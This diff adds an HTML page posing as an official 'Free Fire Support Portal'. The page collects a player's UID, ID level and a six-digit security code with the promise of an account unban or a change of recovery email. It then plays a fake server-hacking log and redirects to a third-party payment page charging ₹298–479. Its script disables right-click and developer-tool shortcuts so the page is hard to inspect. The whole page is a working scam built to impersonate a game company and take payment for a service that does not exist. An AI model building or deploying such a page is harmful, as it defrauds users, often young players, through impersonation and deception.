@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Free Fire Support Portal</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        body {
+            background-color: #0a0a0a;
+            color: #fff;
+            background-image: url('https://wallpapercave.com/wp/wp6277399.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 15px;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.75);
+            z-index: -1;
+        }
+
+        /* =========================================
+           1. INTRO MAGNETIC SPLASH SCREEN 
+           ========================================= */
+        .intro-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #050505;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 99999; overflow: hidden;
+        }
+
+        #introMagneticText {
+            transition: opacity 0.8s ease, transform 0.8s ease, filter 0.8s ease;
+            display: flex; flex-wrap: wrap; justify-content: center;
+            max-width: 95%; text-align: center; perspective: 1000px;
+        }
+
+        .char {
+            font-family: 'Montserrat', sans-serif; 
+            font-size: 3.8rem; font-weight: 900;
+            color: #ff9d00; /* Free Fire Orange/Yellow Branding */
+            text-transform: uppercase;
+            /* Deep Glow matching the text color */
+            text-shadow: 0 0 20px rgba(255, 157, 0, 0.9), 0 0 40px rgba(255, 100, 0, 0.7); 
+            display: inline-block; opacity: 0;
+            will-change: transform, opacity;
+        }
+
+        /* Container */
+        .container {
+            width: 100%;
+            max-width: 700px;
+            opacity: 0;
+            transform: scale(0.95);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+            display: none; 
+        }
+
+        .container.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        /* Liquid Glass Panel */
+        .glass-panel {
+            background: rgba(20, 20, 25, 0.45);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 157, 0, 0.3);
+            border-radius: 20px;
+            padding: 35px 25px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6), inset 0 0 20px rgba(255, 157, 0, 0.05);
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            max-width: 150px;
+            margin-bottom: 15px;
+            animation: pulse 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes pulse {
+            from { filter: drop-shadow(0 0 5px rgba(255, 157, 0, 0.7)); }
+            to { filter: drop-shadow(0 0 20px rgba(255, 157, 0, 1)); }
+        }
+
+        /* Shiny Title */
+        .shiny-title-wrapper {
+            position: relative;
+            display: inline-block;
+            overflow: hidden; 
+            padding: 5px 15px;
+        }
+
+        .shiny-title-wrapper::before {
+            content: ''; 
+            position: absolute; 
+            top: 0; left: -100%; width: 50%; height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.8), transparent);
+            transform: skewX(-25deg); 
+            animation: slideLight 3.5s infinite linear;
+            pointer-events: none; z-index: 5; mix-blend-mode: overlay; 
+        }
+
+        @keyframes slideLight { 
+            0% { left: -100%; } 
+            100% { left: 200%; } 
+        }
+
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.2rem;
+            text-transform: uppercase;
+            font-weight: 900;
+            color: #ff9d00;
+            text-shadow: 0 0 15px rgba(255, 157, 0, 0.8);
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #ffcc00;
+            font-size: 1.05rem;
+        }
+        
+        .label-note {
+            color: #ffaaaa;
+            opacity: 0.8;
+            font-size: 0.85rem;
+            font-weight: normal;
+        }
+        
+        input[type="text"], input[type="number"], input[type="email"], select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 157, 0, 0.2);
+            background: rgba(0, 0, 0, 0.5);
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s ease;
+            -webkit-user-select: text; 
+            user-select: text;
+        }
+        
+        input:focus, select:focus {
+            border-color: #ff9d00;
+            background: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 0 10px rgba(255, 157, 0, 0.4);
+        }
+        
+        /* Custom Checkbox Style */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            opacity: 0.7;
+            transition: opacity 0.3s ease;
+            cursor: pointer;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border: 1px dashed rgba(255, 157, 0, 0.4);
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-container:hover, .checkbox-container.checked {
+            opacity: 1;
+            border-color: #ff9d00;
+            background: rgba(255, 157, 0, 0.1);
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 22px;
+            height: 22px;
+            margin-right: 15px;
+            cursor: pointer;
+            accent-color: #ff9d00;
+        }
+
+        .checkbox-container label {
+            margin-bottom: 0;
+            cursor: pointer;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        /* Radio Buttons for Ban Type */
+        .radio-group {
+            display: flex;
+            gap: 20px;
+            margin-top: 10px;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+        }
+
+        .radio-item {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .radio-item input[type="radio"] {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            accent-color: #ff9d00;
+            cursor: pointer;
+        }
+
+        .radio-item label {
+            color: #fff;
+            margin-bottom: 0;
+            font-size: 0.95rem;
+            font-weight: normal;
+            cursor: pointer;
+        }
+
+        .error-message {
+            color: #ff4d4d;
+            font-size: 0.9rem;
+            margin-top: 5px;
+            display: none;
+            font-weight: bold;
+        }
+        
+        /* Button Styles */
+        .btn-submit {
+            background: linear-gradient(135deg, #ff9d00, #ff5500);
+            color: #fff;
+            border: 2px solid rgba(255, 157, 0, 0.5);
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 10px;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-weight: 900;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 157, 0, 0.4);
+            margin-top: 10px;
+            letter-spacing: 1px;
+        }
+        
+        .btn-submit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 157, 0, 0.6);
+        }
+        
+        .btn-submit:active {
+            transform: translateY(1px);
+        }
+
+        /* File Upload */
+        input[type="file"] {
+            color: #fff;
+            padding: 10px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 157, 0, 0.2);
+            width: 100%;
+        }
+
+        /* Progress Bar Styles */
+        .progress-container {
+            margin: 0 0 20px 0;
+            height: 30px;
+            background-color: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .progress-bar {
+            width: 0;
+            height: 100%;
+            background: linear-gradient(90deg, #ff9d00, #ff5500, #ffcc00);
+            border-radius: 15px;
+            transition: width 0.3s ease;
+        }
+        
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-weight: bold;
+            text-shadow: 0 0 5px #000;
+            z-index: 1;
+        }
+        
+        /* Status Messages */
+        .status-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        
+        .status-item {
+            text-align: center;
+            flex: 1;
+            padding: 20px 5px; 
+            border-radius: 10px;
+            margin: 0 5px;
+            background-color: rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .status-item.active {
+            background-color: rgba(255, 157, 0, 0.8);
+            box-shadow: 0 0 15px rgba(255, 157, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            z-index: 10;
+        }
+        
+        .status-item.success {
+            background-color: #ff9d00;
+            box-shadow: 0 0 10px rgba(255, 157, 0, 0.5);
+        }
+        
+        .status-item h3 {
+            font-size: 1rem;
+            margin-bottom: 0;
+            color: #fff;
+        }
+        
+        /* Process Log Styles */
+        .process-log {
+            background-color: rgba(0, 0, 0, 0.6);
+            border-radius: 10px;
+            padding: 15px;
+            height: 220px;
+            overflow: auto;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.95rem;
+            color: #fff;
+            margin-bottom: 10px;
+            border: 1px solid rgba(255, 157, 0, 0.3);
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.8);
+        }
+        
+        .log-entry {
+            margin-bottom: 8px;
+            line-height: 1.5;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        
+        .log-entry.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .log-entry .highlight { color: #ffcc00; font-weight: bold; text-shadow: 0 0 5px rgba(255,204,0,0.5);}
+        .log-entry .green { color: #00ff44; font-weight: bold; }
+        .log-entry .blue { color: #00ccff; font-weight: bold; }
+        .log-entry .purple { color: #aa00ff; font-weight: bold; }
+        .log-entry .red { color: #ff3366; font-weight: bold; }
+        
+        /* Transition Screen */
+        .transition-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        
+        .transition-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .transition-image {
+            max-width: 15%;
+            max-height: 15%;
+        }
+        
+        @keyframes blinkImage {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(0.95); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        
+        .transition-image.blink {
+            animation: blinkImage 1s infinite ease-in-out;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            h1 { font-size: 1.8rem; }
+            .char { font-size: 2.5rem; }
+            .glass-panel { padding: 25px 15px; }
+            .status-container { flex-wrap: wrap; }
+            .status-item { flex: 1 0 45%; margin-bottom: 10px; padding: 15px; }
+            .transition-image { max-width: 30%; max-height: 30%; }
+        }
+
+        /* Hide scrollbar for logs */
+        .process-log::-webkit-scrollbar { width: 4px; }
+        .process-log::-webkit-scrollbar-track { background: transparent; }
+        .process-log::-webkit-scrollbar-thumb { background: #ff9d00; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+    <div class="intro-overlay" id="introOverlay">
+        <div class="magnetic-container" id="introMagneticText"></div>
+    </div>
+
+    <div class="transition-screen" id="transitionScreen">
+        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image" id="transitionImage">
+    </div>
+
+    <div class="container" id="mainContainer">
+        
+        <div class="glass-panel" id="formPanel">
+            <header>
+                <img src="https://pending404.github.io/image/g-ff-logo.webp" alt="Free Fire Logo" class="logo">
+                <div class="shiny-title-wrapper">
+                    <h1>FREE FIRE SUPPORT</h1>
+                </div>
+            </header>
+            
+            <form id="unbanForm">
+                <div class="form-group">
+                    <label for="playerID">Free Fire Player ID (UID)</label>
+                    <input type="text" id="playerID" placeholder="Enter your Free Fire UID" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                    <p class="error-message" id="playerIDError">Please enter a valid UID</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="device">Your Device</label>
+                    <select id="device" required>
+                        <option value="" disabled selected>Choose your device</option>
+                        <option value="android">Android</option>
+                        <option value="ios">iOS (iPhone)</option>
+                        <option value="pc">PC (emulator)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="server">Server/Region</label>
+                    <select id="server" required>
+                        <option value="" disabled selected>Select your server</option>
+                        <option value="india">India</option>
+                        <option value="thailand">Thailand</option>
+                        <option value="brazil">Brazil</option>
+                        <option value="mena">MENA</option>
+                        <option value="indonesia">Indonesia</option>
+                        <option value="bangladesh">Bangladesh</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="idLevel">ID Level</label>
+                    <input type="number" id="idLevel" placeholder="Enter your Free Fire ID level" min="1" required>
+                    <p class="error-message" id="idLevelError">Your ID level does not match</p>
+                </div>
+
+                <div class="form-group checkbox-container" id="checkboxContainer">
+                    <input type="checkbox" id="unbanCheck">
+                    <label for="unbanCheck">Account Unban</label>
+                </div>
+                
+                <div class="form-group" id="banTypeGroup" style="display: none;">
+                    <label>Select Ban Type</label>
+                    <div class="radio-group">
+                        <div class="radio-item">
+                            <input type="radio" id="permBan" name="banType" value="permanent">
+                            <label for="permBan">Permanent Ban</label>
+                        </div>
+                        <div class="radio-item">
+                            <input type="radio" id="tempBan" name="banType" value="temporary">
+                            <label for="tempBan">Temporary Ban</label>
+                        </div>
+                    </div>
+                    <p class="error-message" id="banTypeError">Please select a Ban Type</p>
+                </div>
+
+                <div class="form-group" id="screenshotGroup" style="display: none;">
+                    <label for="screenshot">Upload Screenshot <span class="label-note">(screenshot of ban message)</span></label>
+                    <input type="file" id="screenshot" accept="image/*">
+                </div>
+
+                <div class="form-group checkbox-container" id="emailCheckboxContainer">
+                    <input type="checkbox" id="bindEmailCheck">
+                    <label for="bindEmailCheck">Change recovery email <span class="label-note">(new bind email)</span></label>
+                </div>
+
+                <div class="form-group" id="bindEmailGroup" style="display: none;">
+                    <label for="bindEmail">New Email Address</label>
+                    <input type="email" id="bindEmail" placeholder="Enter new email for binding">
+                    
+                    <label for="securityCode" style="margin-top: 15px;">Security Code</label>
+                    <input type="text" id="securityCode" placeholder="Enter 6-digit security code" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    <p class="error-message" id="securityCodeError">Please enter a valid 6-digit security code</p>
+                </div>
+                
+                <p class="error-message" id="serviceError" style="text-align: center; margin-bottom: 10px;">⚠ Please select at least one option: "Change Email" or "Account Unban"</p>
+
+                <button type="submit" class="btn-submit">PROCEED</button>
+            </form>
+        </div>
+        
+        <div class="glass-panel" id="processingContainer" style="display: none;">
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+                <div class="progress-text" id="progressText">0%</div>
+            </div>
+            
+            <div class="status-container">
+                <div class="status-item" id="statusConnect">
+                    <h3>Connecting</h3>
+                </div>
+                <div class="status-item" id="statusVerify">
+                    <h3>Verifying</h3>
+                </div>
+                <div class="status-item" id="statusAccess">
+                    <h3 id="textAccess">Accessing</h3>
+                </div>
+                <div class="status-item" id="statusFinalStep">
+                    <h3 id="finalStepText">Unbanning</h3>
+                </div>
+            </div>
+            
+            <div class="process-log" id="processLog">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Security (Disable Right Click / Inspect)
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.onkeydown = function(e) {
+                if(e.keyCode == 123) return false;
+                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
+                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+            }
+
+            // --- INTRO MAGNETIC ANIMATION ---
+            const introOverlay = document.getElementById('introOverlay');
+            const introMagneticText = document.getElementById('introMagneticText');
+            const mainContainer = document.getElementById('mainContainer');
+
+            function runIntroAnimation() {
+                const text = "FREE FIRE SUPPORT";
+                const words = text.split(' ');
+                let charElements = [];
+
+                words.forEach((word, wordIndex) => {
+                    const wordDiv = document.createElement('div');
+                    wordDiv.style.display = 'inline-block';
+                    wordDiv.style.margin = '0 10px';
+
+                    word.split('').forEach(char => {
+                        const span = document.createElement('span');
+                        span.innerText = char;
+                        span.className = 'char';
+                        
+                        const rx = (Math.random() - 0.5) * 3000;
+                        const ry = (Math.random() - 0.5) * 3000;
+                        const rz = (Math.random() - 0.5) * 1000;
+                        const rotate = (Math.random() - 0.5) * 720;
+                        
+                        span.style.transform = `translate3d(${rx}px, ${ry}px, ${rz}px) rotate(${rotate}deg) scale(3)`;
+                        wordDiv.appendChild(span);
+                        charElements.push(span);
+                    });
+                    
+                    introMagneticText.appendChild(wordDiv);
+                    if (wordIndex === 1) introMagneticText.appendChild(document.createElement('br'));
+                });
+
+                setTimeout(() => {
+                    charElements.forEach((span, i) => {
+                        setTimeout(() => {
+                            span.style.transition = 'transform 1s cubic-bezier(0.165, 0.84, 0.44, 1), opacity 0.8s ease';
+                            span.style.transform = 'translate3d(0,0,0) rotate(0deg) scale(1)';
+                            span.style.opacity = '1';
+                        }, i * 40); 
+                    });
+                }, 100);
+
+                const assembleTime = (charElements.length * 40) + 1200;
+
+                setTimeout(() => {
+                    introMagneticText.style.opacity = '0';
+                    introMagneticText.style.transform = 'scale(1.2)';
+                    introMagneticText.style.filter = 'blur(10px)';
+                }, assembleTime + 1000);
+
+                const vanishTime = assembleTime + 1800;
+
+                setTimeout(() => {
+                    introOverlay.style.display = 'none';
+                    mainContainer.style.display = 'block';
+                    setTimeout(() => { mainContainer.classList.add('show'); }, 50);
+                }, vanishTime); 
+            }
+
+            runIntroAnimation();
+
+            // --- FORM ELEMENTS ---
+            const unbanForm = document.getElementById('unbanForm');
+            const playerIDInput = document.getElementById('playerID');
+            const deviceSelect = document.getElementById('device');
+            const serverSelect = document.getElementById('server');
+            const idLevelInput = document.getElementById('idLevel');
+            
+            const unbanCheck = document.getElementById('unbanCheck');
+            const checkboxContainer = document.getElementById('checkboxContainer');
+            const screenshotGroup = document.getElementById('screenshotGroup');
+            const screenshotInput = document.getElementById('screenshot');
+            const banTypeGroup = document.getElementById('banTypeGroup');
+            
+            const bindEmailCheck = document.getElementById('bindEmailCheck');
+            const emailCheckboxContainer = document.getElementById('emailCheckboxContainer');
+            const bindEmailGroup = document.getElementById('bindEmailGroup');
+            const bindEmailInput = document.getElementById('bindEmail');
+            const securityCodeInput = document.getElementById('securityCode');
+
+            const formPanel = document.getElementById('formPanel');
+            const processingContainer = document.getElementById('processingContainer');
+            const transitionScreen = document.getElementById('transitionScreen');
+            const transitionImage = document.getElementById('transitionImage');
+
+            // --- TOGGLE LOGIC ---
+            unbanCheck.addEventListener('change', function() {
+                document.getElementById('serviceError').style.display = 'none';
+                if(this.checked) {
+                    screenshotGroup.style.display = 'block';
+                    banTypeGroup.style.display = 'block';
+                    checkboxContainer.classList.add('checked');
+                } else {
+                    screenshotGroup.style.display = 'none';
+                    banTypeGroup.style.display = 'none';
+                    checkboxContainer.classList.remove('checked');
+                    // Reset radios
+                    document.querySelectorAll('input[name="banType"]').forEach(r => r.checked = false);
+                }
+            });
+
+            bindEmailCheck.addEventListener('change', function() {
+                document.getElementById('serviceError').style.display = 'none';
+                if(this.checked) {
+                    bindEmailGroup.style.display = 'block';
+                    emailCheckboxContainer.classList.add('checked');
+                    bindEmailInput.setAttribute('required', 'true');
+                } else {
+                    bindEmailGroup.style.display = 'none';
+                    emailCheckboxContainer.classList.remove('checked');
+                    bindEmailInput.removeAttribute('required');
+                    securityCodeInput.value = "";
+                }
+            });
+
+            // --- FORM SUBMIT LOGIC ---
+            unbanForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                let isValid = true;
+                
+                // Reset Errors
+                document.querySelectorAll('.error-message').forEach(e => e.style.display = 'none');
+                
+                if (!bindEmailCheck.checked && !unbanCheck.checked) {
+                    document.getElementById('serviceError').style.display = 'block';
+                    isValid = false;
+                }
+
+                if (playerIDInput.value.trim().length < 8) {
+                    document.getElementById('playerIDError').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const idLevel = parseInt(idLevelInput.value);
+                if (isNaN(idLevel) || idLevel < 15) {
+                    document.getElementById('idLevelError').style.display = 'block';
+                    isValid = false;
+                }
+
+                // Ban Type validation
+                if (unbanCheck.checked) {
+                    const selectedBan = document.querySelector('input[name="banType"]:checked');
+                    if (!selectedBan) {
+                        document.getElementById('banTypeError').style.display = 'block';
+                        isValid = false;
+                    }
+                }
+
+                // Security Code validation
+                if (bindEmailCheck.checked) {
+                    const code = securityCodeInput.value.trim();
+                    if (!/^\d{6}$/.test(code)) {
+                        document.getElementById('securityCodeError').style.display = 'block';
+                        isValid = false;
+                    }
+                }
+                
+                if (isValid) {
+                    const formData = {
+                        playerID: playerIDInput.value.trim(),
+                        bindEmail: bindEmailInput.value.trim(),
+                        device: deviceSelect.value,
+                        server: serverSelect.value,
+                        idLevel: idLevel,
+                        isUnbanChecked: unbanCheck.checked,
+                        isEmailChecked: bindEmailCheck.checked,
+                        banType: unbanCheck.checked ? document.querySelector('input[name="banType"]:checked').value : null
+                    };
+                    
+                    startTransition(formData);
+                }
+            });
+
+            function startTransition(formData) {
+                transitionScreen.classList.add('active');
+                transitionImage.classList.add('blink');
+                
+                setTimeout(function() {
+                    transitionScreen.classList.remove('active');
+                    transitionImage.classList.remove('blink');
+                    
+                    formPanel.style.display = 'none';
+                    processingContainer.style.display = 'block';
+                    
+                    const textAccess = document.getElementById('textAccess');
+                    const finalStepText = document.getElementById('finalStepText');
+                    
+                    if (formData.isUnbanChecked && formData.isEmailChecked) {
+                        textAccess.textContent = "Email Binding";
+                        finalStepText.textContent = "Unbanning";
+                    } else if (formData.isUnbanChecked) {
+                        textAccess.textContent = "Accessing";
+                        finalStepText.textContent = "Unbanning";
+                    } else if (formData.isEmailChecked) {
+                        textAccess.textContent = "Accessing";
+                        finalStepText.textContent = "Email Binding";
+                    }
+                    
+                    startProcessing(formData);
+                }, 2000);
+            }
+
+            function startProcessing(formData) {
+                let logMessages = [];
+                let paymentAmount = 0;
+
+                logMessages.push(
+                    `<span class="green">Initializing</span> system protocol...`,
+                    `<span class="blue">Connecting</span> to Garena Free Fire servers...`,
+                    `Connection <span class="green">established</span>. Authenticating...`,
+                    `<span class="blue">Accessing</span> database...`,
+                    `<span class="purple">Locating</span> player UID: <span class="highlight">${formData.playerID}</span>...`,
+                    `Device info <span class="blue">identified</span>: <span class="highlight">${formData.device.toUpperCase()}</span>`
+                );
+
+                if (formData.isUnbanChecked && formData.isEmailChecked) {
+                    paymentAmount = 479; 
+                    logMessages.push(
+                        `<span class="red">ALERT:</span> Account Flagged - ${formData.banType.toUpperCase()} BAN`,
+                        `<span class="green">Multiple Requests</span> detected.`,
+                        `<span class="blue">Decrypting</span> ban security protocols...`,
+                        screenshotInput.files.length > 0 ? `Screenshot proof <span class="green">verified</span>.` : `<span class="red">Warning: No proof found!</span>`,
+                        `<span class="purple">Removing</span> Blacklist flags...`,
+                        `<span class="blue">Initiating</span> Email Change Protocol...`,
+                        `Verifying Security Code... <span class="green">Success</span>`,
+                        `Binding new email: <span class="highlight">${formData.bindEmail}</span>...`,
+                        `<span class="purple">Finalizing</span> All processes...`
+                    );
+                }
+                else if (formData.isUnbanChecked) {
+                    paymentAmount = 398;
+                    logMessages.push(
+                        `<span class="red">ALERT:</span> Account Flagged - ${formData.banType.toUpperCase()} BAN`,
+                        `Protocol: <span class="purple">ACCOUNT UNBAN</span> initiated.`,
+                        `<span class="blue">Decrypting</span> ban security protocols...`,
+                        screenshotInput.files.length > 0 ? `Screenshot proof <span class="green">verified</span>.` : `<span class="red">Warning: No proof found!</span>`,
+                        `<span class="purple">Removing</span> Blacklist flags...`,
+                        `<span class="green">Cleaning</span> account records...`,
+                        `<span class="purple">Finalizing</span> Unban process...`
+                    );
+                }
+                else if (formData.isEmailChecked) {
+                    paymentAmount = 298;
+                    logMessages.push(
+                        `Protocol: <span class="blue">EMAIL BINDING</span> initiated.`,
+                        `<span class="green">Verifying</span> new email address...`,
+                        `Verifying Security Code... <span class="green">Success</span>`,
+                        `Email <span class="green">valid</span>: <span class="highlight">${formData.bindEmail}</span>`,
+                        `<span class="purple">Unlinking</span> old login methods...`,
+                        `<span class="green">Updating</span> server records...`,
+                        `<span class="purple">Finalizing</span> Binding process...`
+                    );
+                }
+
+                logMessages.push(
+                    `Process <span class="green">complete</span>!`,
+                    `<span class="highlight">Redirecting to secure gateway (Pay ₹${paymentAmount})...</span>`
+                );
+                
+                let progress = 0;
+                const totalDuration = 8000; 
+                const progressInterval = 50;
+                const progressIncrement = (progressInterval / totalDuration) * 100;
+                
+                const processLog = document.getElementById('processLog');
+                const progressBar = document.getElementById('progressBar');
+                const progressText = document.getElementById('progressText');
+                
+                const statusPoints = { connect: 10, verify: 35, access: 60, final: 85, complete: 100 };
+                const statusConnect = document.getElementById('statusConnect');
+                const statusVerify = document.getElementById('statusVerify');
+                const statusAccess = document.getElementById('statusAccess');
+                const statusFinalStep = document.getElementById('statusFinalStep');
+                
+                statusConnect.classList.add('active');
+                
+                function addLogEntries() {
+                    let currentIndex = 0;
+                    function addNextEntry() {
+                        if (currentIndex >= logMessages.length) return;
+                        const logEntry = document.createElement('div');
+                        logEntry.className = 'log-entry';
+                        logEntry.innerHTML = logMessages[currentIndex];
+                        processLog.appendChild(logEntry);
+                        processLog.scrollTop = processLog.scrollHeight;
+                        
+                        setTimeout(() => { logEntry.classList.add('visible'); }, 50);
+                        currentIndex++;
+                        if (currentIndex < logMessages.length) {
+                            setTimeout(addNextEntry, Math.random() * 400 + 200);
+                        }
+                    }
+                    addNextEntry();
+                }
+                
+                function updateProgress() {
+                    progress += progressIncrement;
+                    if (progress >= 100) {
+                        progress = 100;
+                        progressBar.style.width = `100%`;
+                        progressText.textContent = '100%';
+                        updateStatusUI(100);
+
+                        // --- FAST REDIRECT LOGIC ---
+                        transitionScreen.classList.add('active');
+                        transitionImage.classList.add('blink');
+                        
+                        let redirectUrl = "";
+                        if (formData.isUnbanChecked && formData.isEmailChecked) {
+                            redirectUrl = "https://payment.maxado.in/index.php?token=NDc5fHxhSFIwY0hNNkx5OW1abWhsYkhBdGMyVnlkbWxqWlMxd2IzSjBZV3d1WjJsMGFIVmlMbWx2TDNCbGJtUnBibWN2WTI5dVozSmhkSFZzWVhScGIyNXpMM0IxWWk5bGJXRnBiQzFpYVc1a2FXNW5MWFZ1WW1GdXx8aHR0cHM6Ly9wZW5kaW5nNDA0LmdpdGh1Yi5pby9pbWFnZS9nLWZmLWxvZ28ud2VicA=="; 
+                        } else if (formData.isUnbanChecked) {
+                            redirectUrl = "https://payment.maxado.in/index.php?token=Mzk4fHxhSFIwY0hNNkx5OW1abWhsYkhBdGMyVnlkbWxqWlMxd2IzSjBZV3d1WjJsMGFIVmlMbWx2TDNCbGJtUnBibWN2WTI5dVozSmhkSFZzWVhScGIyNXpMM0IxWWk5MWJtSmhiZz09fHxodHRwczovL3BlbmRpbmc0MDQuZ2l0aHViLmlvL2ltYWdlL2ctZmYtbG9nby53ZWJw";
+                        } else {
+                            redirectUrl = "https://payment.maxado.in/index.php?token=Mjk4fHxhSFIwY0hNNkx5OW1abWhsYkhBdGMyVnlkbWxqWlMxd2IzSjBZV3d1WjJsMGFIVmlMbWx2TDNCbGJtUnBibWN2WTI5dVozSmhkSFZzWVhScGIyNXpMM0IxWWk5bGJXRnBiQzFpYVc1a2FXNW58fGh0dHBzOi8vcGVuZGluZzQwNC5naXRodWIuaW8vaW1hZ2UvZy1mZi1sb2dvLndlYnA=";
+                        }
+                        
+                        // Redirect happens very fast (just 500ms after showing transition image)
+                        setTimeout(function() {
+                            window.location.href = redirectUrl;
+                        }, 500); 
+                        
+                        return; // Stop further processing
+                    }
+                    
+                    progressBar.style.width = `${progress}%`;
+                    progressText.textContent = Math.round(progress) + '%';
+                    updateStatusUI(progress);
+                    
+                    setTimeout(updateProgress, progressInterval);
+                }
+
+                function updateStatusUI(prog) {
+                    if (prog >= statusPoints.connect && prog < statusPoints.verify) {
+                        statusConnect.classList.add('active');
+                    } else if (prog >= statusPoints.verify && prog < statusPoints.access) {
+                        statusConnect.classList.add('success');
+                        statusVerify.classList.add('active');
+                    } else if (prog >= statusPoints.access && prog < statusPoints.final) {
+                        statusConnect.classList.add('success'); statusVerify.classList.add('success');
+                        statusAccess.classList.add('active');
+                    } else if (prog >= statusPoints.final && prog < statusPoints.complete) {
+                        statusConnect.classList.add('success'); statusVerify.classList.add('success'); statusAccess.classList.add('success');
+                        statusFinalStep.classList.add('active');
+                    } else if (prog >= statusPoints.complete) {
+                        statusConnect.classList.add('success'); statusVerify.classList.add('success'); statusAccess.classList.add('success'); statusFinalStep.classList.add('success');
+                    }
+                }
+                
+                addLogEntries();
+                updateProgress();
+            }
+        });
+    </script>
+</body>
+</html>
